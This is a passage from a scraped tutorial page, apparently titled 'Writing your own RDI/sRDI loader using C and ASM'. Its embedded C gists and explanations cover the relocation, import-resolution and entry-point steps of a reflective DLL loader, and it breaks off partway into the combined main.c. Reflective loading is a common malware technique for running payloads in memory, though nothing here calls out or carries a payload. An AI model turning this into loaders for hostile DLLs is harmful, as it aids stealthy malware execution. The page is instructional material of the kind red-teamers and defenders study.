          <td id="file-basic-step-4-c-LC3" class="blob-code blob-code-inner js-file-line">DWORD relocationsProcessed = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-basic-step-4-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-basic-step-4-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">while</span> (relocationsProcessed &lt; relocations.<span class="pl-c1">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-basic-step-4-c-LC6" class="blob-code blob-code-inner js-file-line">    PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-basic-step-4-c-LC7" class="blob-code blob-code-inner js-file-line">    relocationsProcessed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK);</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-basic-step-4-c-LC8" class="blob-code blob-code-inner js-file-line">    DWORD relocationsCount = (relocationBlock-&gt;<span class="pl-smi">BlockSize</span> - <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK)) / <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-basic-step-4-c-LC9" class="blob-code blob-code-inner js-file-line">    PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-basic-step-4-c-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-basic-step-4-c-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (DWORD i = <span class="pl-c1">0</span>; i &lt; relocationsCount; i++) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-basic-step-4-c-LC12" class="blob-code blob-code-inner js-file-line">        relocationsProcessed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-basic-step-4-c-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (relocationEntries[i].<span class="pl-smi">Type</span> == <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-basic-step-4-c-LC14" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">continue</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-basic-step-4-c-LC15" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-basic-step-4-c-LC16" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-basic-step-4-c-LC17" class="blob-code blob-code-inner js-file-line">        DWORD_PTR relocationRVA = relocationBlock-&gt;<span class="pl-smi">PageAddress</span> + relocationEntries[i].<span class="pl-smi">Offset</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-basic-step-4-c-LC18" class="blob-code blob-code-inner js-file-line">        DWORD_PTR addressToPatch = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-basic-step-4-c-LC19" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ReadProcessMemory</span>(<span class="pl-bu">GetCurrentProcess</span>(), (LPCVOID)((DWORD_PTR)dll_base + relocationRVA), &amp;addressToPatch, <span class="pl-k">sizeof</span>(DWORD_PTR), <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-basic-step-4-c-LC20" class="blob-code blob-code-inner js-file-line">        addressToPatch += deltaImageBase;</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-basic-step-4-c-LC21" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((PVOID)((DWORD_PTR)dll_base + relocationRVA), &amp;addressToPatch, <span class="pl-k">sizeof</span>(DWORD_PTR));</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-basic-step-4-c-LC22" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-basic-step-4-c-LC23" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/4173e4d5e374840c6114c6814a9a5ae7/raw/02f2207d027b6a5f6bd982ce1b75ecd59e159b3e/basic-step-4.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/4173e4d5e374840c6114c6814a9a5ae7#file-basic-step-4-c">
          basic-step-4.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>This code is responsible for performing relocation of the DLL image to its new base address. It first gets the relocation data directory and calculates the relocation table's RVA. It then iterates over each block in the relocation table and calculates the address to patch based on the relocation type and offset by using both the <code>PBASE_RELOCATION_ENTRY</code> and <code>PBASE_RELOCATION_BLOCK</code> structures. It reads the original value at the address to patch, adds the delta image base to it, and writes it back to the same location to update the address to the new location. This process ensures that the DLL can run correctly at its new base address.</p><!--kg-card-end: html--><hr><h3 id="basicstep-5">Basic - Step 5</h3><p>The loader performs any necessary imports. An import is a reference to a function...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/3675fdf4c21c5b5b89e6df4b232b6cf7.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121787571" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-basic-step-5-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="basic-step-5.c">
        <tbody><tr>
          <td id="file-basic-step-5-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-basic-step-5-c-LC1" class="blob-code blob-code-inner js-file-line">PIMAGE_IMPORT_DESCRIPTOR importDescriptor = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-basic-step-5-c-LC2" class="blob-code blob-code-inner js-file-line">IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-basic-step-5-c-LC3" class="blob-code blob-code-inner js-file-line">importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dll_base);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-basic-step-5-c-LC4" class="blob-code blob-code-inner js-file-line">PCHAR libraryName = <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-basic-step-5-c-LC5" class="blob-code blob-code-inner js-file-line">HMODULE library = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-basic-step-5-c-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-basic-step-5-c-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-k">while</span> (importDescriptor-&gt;Name != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-basic-step-5-c-LC8" class="blob-code blob-code-inner js-file-line">    libraryName = (PCHAR)importDescriptor-&gt;<span class="pl-smi">Name</span> + (DWORD_PTR)dll_base;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-basic-step-5-c-LC9" class="blob-code blob-code-inner js-file-line">    library = <span class="pl-c1">LoadLibraryA</span>(libraryName);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-basic-step-5-c-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-basic-step-5-c-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (library) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-basic-step-5-c-LC12" class="blob-code blob-code-inner js-file-line">        PIMAGE_THUNK_DATA thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-basic-step-5-c-LC13" class="blob-code blob-code-inner js-file-line">        thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dll_base + importDescriptor-&gt;<span class="pl-smi">FirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-basic-step-5-c-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-basic-step-5-c-LC15" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">while</span> (thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span> != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-basic-step-5-c-LC16" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (<span class="pl-c1">IMAGE_SNAP_BY_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>)) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-basic-step-5-c-LC17" class="blob-code blob-code-inner js-file-line">                LPCSTR functionOrdinal = (LPCSTR)<span class="pl-c1">IMAGE_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-basic-step-5-c-LC18" class="blob-code blob-code-inner js-file-line">                thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span> = (DWORD_PTR)<span class="pl-c1">GetProcAddress</span>(library, functionOrdinal);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-basic-step-5-c-LC19" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-basic-step-5-c-LC20" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-basic-step-5-c-LC21" class="blob-code blob-code-inner js-file-line">                PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dll_base + thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-basic-step-5-c-LC22" class="blob-code blob-code-inner js-file-line">                DWORD_PTR functionAddress = (DWORD_PTR)<span class="pl-c1">GetProcAddress</span>(library, functionName-&gt;<span class="pl-smi">Name</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-basic-step-5-c-LC23" class="blob-code blob-code-inner js-file-line">                thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span> = functionAddress;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-basic-step-5-c-LC24" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-basic-step-5-c-LC25" class="blob-code blob-code-inner js-file-line">            ++thunk;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-basic-step-5-c-LC26" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-basic-step-5-c-LC27" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-basic-step-5-c-LC28" class="blob-code blob-code-inner js-file-line">    importDescriptor++;</td>
        </tr>
        <tr>
          <td id="file-basic-step-5-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-basic-step-5-c-LC29" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/3675fdf4c21c5b5b89e6df4b232b6cf7/raw/1ac1f2c6acca729de00783754167c65b3c0dfd14/basic-step-5.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/3675fdf4c21c5b5b89e6df4b232b6cf7#file-basic-step-5-c">
          basic-step-5.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><p>This code is responsible for loading the imported functions of a DLL. It first retrieves the address of the import directory, then loops through each import descriptor, loading the library containing the imported functions and resolving each imported function by either its name or ordinal value. It then sets the address of each imported function in the appropriate thunk table entry.</p><hr><h3 id="basicstep-6">Basic - Step 6</h3><p>Finally, the loader transfers control to the executable's entry point...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/2272f0684bb3300a8c22ab0121211851.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121787652" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-basic-step-6-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="basic-step-6.c">
        <tbody><tr>
          <td id="file-basic-step-6-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-basic-step-6-c-LC1" class="blob-code blob-code-inner js-file-line">DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dll_base + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</td>
        </tr>
        <tr>
          <td id="file-basic-step-6-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-basic-step-6-c-LC2" class="blob-code blob-code-inner js-file-line">(*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-6-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-basic-step-6-c-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-6-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-basic-step-6-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-en">CloseHandle</span>(dll);</td>
        </tr>
        <tr>
          <td id="file-basic-step-6-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-basic-step-6-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-en">HeapFree</span>(GetProcessHeap(), 0, dll_bytes);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/2272f0684bb3300a8c22ab0121211851/raw/bbd95406e7d9e24a0eef0a99310e2b9ade00b1f9/basic-step-6.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/2272f0684bb3300a8c22ab0121211851#file-basic-step-6-c">
          basic-step-6.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>This code snippet gets the address of the DLL entry point using the AddressOfEntryPoint field of the OptionalHeader of the loaded DLL. It then casts this address to a function pointer of type <code>DLLEntry</code>, which is a type that represents the entry point of a DLL. The (*DllEntry) syntax dereferences the function pointer and calls the entry point function with the <code>HINSTANCE</code> of the loaded DLL, the <code>DLL_PROCESS_ATTACH</code> flag, and a value of 0 for the third parameter. Finally, the code releases the resources allocated for loading the DLL, including closing the handle to the file and freeing the memory allocated for storing the DLL bytes.</p><!--kg-card-end: html--><hr><h3 id="basic-final">Basic Final</h3><p>Taking all the steps above and putting it together will look like the following example.</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/5af437a474d580da8a172e95bdb1b2a3.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121781104" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-main-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="main.c">
        <tbody><tr>
          <td id="file-main-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-main-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>windows.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-main-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-main-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-main-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-main-c-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-main-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_BLOCK {</td>
        </tr>
        <tr>
          <td id="file-main-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-main-c-LC5" class="blob-code blob-code-inner js-file-line">    DWORD PageAddress;</td>
        </tr>
        <tr>
          <td id="file-main-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-main-c-LC6" class="blob-code blob-code-inner js-file-line">    DWORD BlockSize;</td>
        </tr>
        <tr>
          <td id="file-main-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-main-c-LC7" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;</td>
        </tr>
        <tr>
          <td id="file-main-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-main-c-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-main-c-LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_ENTRY {</td>
        </tr>
        <tr>
          <td id="file-main-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-main-c-LC10" class="blob-code blob-code-inner js-file-line">    USHORT Offset : <span class="pl-c1">12</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-main-c-LC11" class="blob-code blob-code-inner js-file-line">    USHORT Type : <span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-main-c-LC12" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;</td>
        </tr>
        <tr>
          <td id="file-main-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-main-c-LC13" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-main-c-LC14" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">BOOL</span> (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);</td>
        </tr>
        <tr>
          <td id="file-main-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-main-c-LC15" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-main-c-LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>() {</td>
        </tr>
        <tr>
          <td id="file-main-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-main-c-LC17" class="blob-code blob-code-inner js-file-line">   </td>
        </tr>
        <tr>
          <td id="file-main-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-main-c-LC18" class="blob-code blob-code-inner js-file-line">    HANDLE dll = <span class="pl-c1">CreateFileA</span>(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>??<span class="pl-cce">\\</span>C:<span class="pl-cce">\\</span>Temp<span class="pl-cce">\\</span>dll_poc.dll<span class="pl-pds">"</span></span>, GENERIC_READ, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>, OPEN_EXISTING, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-main-c-LC19" class="blob-code blob-code-inner js-file-line">    DWORD64 dll_size = <span class="pl-c1">GetFileSize</span>(dll, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-main-c-LC20" class="blob-code blob-code-inner js-file-line">    LPVOID dll_bytes = <span class="pl-c1">HeapAlloc</span>(<span class="pl-c1">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, dll_size);</td>
        </tr>
        <tr>
          <td id="file-main-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-main-c-LC21" class="blob-code blob-code-inner js-file-line">    DWORD out_size = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-main-c-LC22" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ReadFile</span>(dll, dll_bytes, dll_size, &amp;out_size, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-main-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-main-c-LC24" class="blob-code blob-code-inner js-file-line">    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dll_bytes;</td>
        </tr>
        <tr>
          <td id="file-main-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-main-c-LC25" class="blob-code blob-code-inner js-file-line">    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dll_bytes + dosHeaders-&gt;<span class="pl-smi">e_lfanew</span>);</td>
